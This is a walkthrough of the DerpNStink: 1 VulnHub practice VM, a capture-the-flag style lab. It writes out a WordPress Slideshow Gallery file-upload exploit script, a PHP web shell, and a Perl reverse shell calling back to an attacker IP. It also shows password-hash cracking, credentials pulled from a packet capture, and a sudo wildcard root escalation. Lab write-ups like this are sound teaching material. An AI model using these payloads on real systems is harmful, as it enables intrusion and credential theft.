This post documents the complete walkthrough of DerpNStink: 1, a boot2root VM created by Bryan Smith, and hosted at VulnHub. If you are uncomfortable with spoilers, please stop reading now.

Background
Mr. Derp and Uncle Stinky are two system administrators starting their own company, DerpNStink. Instead of hiring qualified professionals to build up their IT landscape, they decide to hack together their own system which is almost ready to go liveâ¦
Information Gathering
Letâs kick this off with a nmap scan to establish the services available in the host.
# nmap -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.10.130
...
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 64 vsftpd 3.0.2
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)

| http-robots.txt: 2 disallowed entries
|_/php/ /temporary/
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: DeRPnStiNK

My usual game plan is to target the web service first whenever nmap tells me robots.txt exists. Letâs start with that.
HTML Source Code
I manage to capture the first flag using curl and some grep-fu on the HTML source code. Easy.
# curl -s 192.168.10.130 | grep -P 'href=|src=|&lt;!?--' | sed -r 's/^\s+//'
&lt;link rel="stylesheet" href="css/style.css"&gt;
&lt;script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js"&gt;&lt;/script&gt;
&lt;script type="text/javascript" src="/is/js/release/kveik.1.4.24.js?1"&gt;&lt;/script&gt;
&lt;script type="text/info" src="/webnotes/info.txt"&gt;&lt;/script&gt;
&lt;!-- particles.js container --&gt;
&lt;!-- stats - count particles --&gt;
&lt;img src="derp.png"&gt;
&lt;img src="stinky.png"&gt;
&lt;script src='js/particles.min.js'&gt;&lt;/script&gt;
&lt;script src="js/index.js"&gt;&lt;/script&gt;
&lt;--flag1(52E37291AEDF6A46D7D0BB8A6312F4F9F1AA4975C248C3F0E008CBA09D6E9166) --&gt;

Web Notes
I notice something else from the HTML source code as wellâ/webnotes

The information from /webnotes tells us the following:

The FQDN of the host is derpnstink.local; and
DocumentRoot is at /var/www/html; and
User stinky exists.

Iâm able to find these directories with gobuster and /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt.

Both /php and /temporary are already in robots.txt.
It appears that /weblog is the root directory for WordPress, and thereâs a need to place the FQDN derpnstink.local in /etc/hosts as seen in the redirection below.

Thereâs another hint from /webnotes/info.txt to do likewise.
&lt;-- @stinky, make sure to update your hosts file with local dns so the new derpnstink blog can be reached before it goes live --&gt;

Slideshow Gallery &lt; 1.4.7 Arbitrary File Upload
I list down all the plugins installed in WordPress with wpscan, and I find a particular version (1.4.6) of the Slideshow Gallery plugin that has an arbitrary file upload vulnerability.
I wrote upload.sh, a bash script to exploit the vulnerability, and to upload files.
upload.sh
#!/bin/bash

HOST=derpnstink.local
BLOG=weblog
USER=admin
PASS=$USER
VULN="wp-admin/admin.php?page=slideshow-slides&amp;method=save"
FILE=$1

# authenticate
curl \
    -s \
    -c cookie \
    -d "log=$USER&amp;pwd=$PASS&amp;wp-submit=Log" \
    http://$HOST/$BLOG/wp-login.php

# exploit
curl \
    -s \
    -b cookie \
    -H "Expect:" \
    -o /dev/null \
    -F "Slide[id]=" \
    -F "Slide[order]=" \
    -F "Slide[title]=$(mktemp -u | sed -r 's/^.*tmp\.(.*)$/\1/')" \
    -F "Slide[description]=" \
    -F "Slide[showinfo]=both" \
    -F "Slide[iopacity]=70" \
    -F "Slide[galleries][]=1" \
    -F "Slide[type]=file" \
    -F "[email protected]$FILE;filename=$FILE;type=application/octet-stream" \
    -F "Slide[image_url]=" \
    -F "Slide[uselink]=N" \
    -F "Slide[link]=" \
    -F "Slide[linktarget]=self" \
    -F "submit=Save Slide" \
    http://$HOST/$BLOG/$VULN

# cleanup
rm -rf cookie

I upload a simple PHP file that executes remote command, with the script.
# cat cmd.php
&lt;pre&gt;&lt;?php echo shell_exec($_GET['cmd']);?&gt;&lt;/pre&gt;

# ./upload.sh cmd.php

The uploaded file is at http://derpnstink.local/weblog/wp-content/uploads/slideshow-gallery/cmd.php.
Low-Privilege Shell
After the upload, the next step is to trigger a reverse shell. Whenever possible, I like to use Perl for my reverse shell; Perl is widely available in most Linux distributions.
perl -e 'use Socket;$i="192.168.10.129";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'

Since we are putting the above command to cmd.php, itâs best to urlencode it to avoid complications. The entire URL looks like this.
http://derpnstink.local/weblog/wp-content/uploads/slideshow-gallery/cmd.php?cmd=perl%20-e%20%27use%20Socket%3B%24i%3D%22192.168.10.129%22%3B%24p%3D443%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2Fbin%2Fsh%20-i%22%29%3B%7D%3B%27

On my end, I set up my netcat listener and wait for the shell.

Letâs spawn a pseudo-TTY for better display and output control.

Database Dump
Now that Iâve access to a low-privilege shell, letâs dump the WordPress database. I should be able to locate the database configuration parameters in the WordPress directory.

$ cat wp-config.php
...
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'mysql');

Letâs proceed to dump and view the database.
$ mysqldump -uroot -pmysql wordpress &gt; /tmp/dump.txt

I manage to capture the second flag, and discover WordPress password hashes from the dump.
'flag2(a7d355b26bda6bf1196ccffead0b2cf2b81f0a9de5b4876b44407f1dc07e51e6)','Flag.txt','','draft','open','open'

INSERT INTO `wp_users` VALUES (1,'unclestinky','$P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41','unclestinky','[email protected]','','2017-11-12 03:25:32','1510544888:$P$BQbCmzW/ICRqb1hU96nIVUFOlNMKJM1',0,'unclestinky',''),(2,'admin','$P$BgnU3VLAv.RWd3rdrkfVIuQr6mFvpd/','admin','[email protected]','','2017-11-13 04:29:35','',0,'admin','');

John the Ripper
Using John the Ripper with a wordlist like ârockyouâ on Kali Linux, cracking WordPress password hashes is easy.
# john --format=phpass --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
# john --show hashes.txt
unclestinky:wedgie57:::::
admin:admin:::::

Getting to South Park
Remember that we are still in the low-privileged shell? And since /etc/passwd is world-readable, letâs determine the users in the host.
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
...
sshd:x:117:65534::/var/run/sshd:/usr/sbin/nologin
stinky:x:1001:1001:Uncle Stinky,,,:/home/stinky:/bin/bash
ftp:x:118:126:ftp daemon,,,:/srv/ftp:/bin/false
mrderp:x:1000:1000:Mr. Derp,,,:/home/mrderp:/bin/bash

Letâs see if we can log in to Uncle Stinkyâs account with the password (wedgie57).

I discover the third flag at /home/stinky/Desktop/flag.txt during enumeration of Uncle Stinkyâs account.
Moving on, I uncover a conversation between Mr. Derp and Uncle Stinky. It appears that Mr. Derp canât log in to WordPress and Uncle Stinky has captured network traffic to assist in troubleshooting the issue.
$ cd ~/ftp/files/network-logs
$ cat derpissues.txt
12:06 mrderp: hey i cant login to wordpress anymore. Can you look into it?
12:07 stinky: yeah. did you need a password reset?
12:07 mrderp: I think i accidently deleted my account
12:07 mrderp: i just need to logon once to make a change
12:07 stinky: im gonna packet capture so we can figure out whats going on
12:07 mrderp: that seems a bit overkill, but wtv
12:08 stinky: commence the sniffer!!!!
12:08 mrderp: -_-
12:10 stinky: fine derp, i think i fixed it for you though. cany you try to login?
12:11 mrderp: awesome it works!
12:12 stinky: we really are the best sysadmins #team
12:13 mrderp: i guess we are...
12:15 mrderp: alright I made the changes, feel free to decomission my account
12:20 stinky: done! yay

$ cd ~/Documents
$ tcpdump -nt -r derpissues.pcap -A 2&gt;/dev/null | grep -P 'pwd='
log=unclestinky%40derpnstink.local&amp;pwd=wedgie57&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2Fderpnstink.local%2Fweblog%2Fwp-admin%2F&amp;testcookie=1
log=mrderp&amp;pwd=derpderpderpderpderpderpderp&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2Fderpnstink.local%2Fweblog%2Fwp-admin%2F&amp;testcookie=1
log=unclestinky%40derpnstink.local&amp;pwd=wedgie57&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2Fderpnstink.local%2Fweblog%2Fwp-admin%2F&amp;testcookie=1

Letâs log in to Mr. Derpâs account with the password (derpderpderpderpderpderpderp) we recover from the packet capture.

I also uncover a helpdesk ticket during enumeration of Mr. Derpâs account. Apparently, Mr. Derp has an issue with sudoer.
$ cd /support
$ cat troubleshooting.txt
*******************************************************************
On one particular machine I often need to run sudo commands every now and then. I am fine with entering password on sudo in most of the cases.

However i dont want to specify each command to allow

How can I exclude these commands from password protection to sudo?

Unbeknownst to poor Mr. Derp and Uncle Stinky, this is in fact the answer to privilege escalation.
Privilege Escalation
Assuming that mrderp ALL=(ALL) /home/mrderp/binaries/derpy* is in /etc/sudoers, we can take the following actions to gain root privileges.
$ mkdir -p /home/mrderp/binaries
$ echo -e '#!/usr/bin/env python\nimport os\nos.setuid(0)\nos.setgid(0)\nos.system("/bin/bash")' &gt; /home/mrderp/binaries/derpy
$ chmod +x /home/mrderp/binaries/derpy
$ sudo /home/mrderp/binaries/derpy

And since we already know the password to Mr. Derpâs account.

Boom.
The fourth flag is at /root/Desktop/flag.txt.
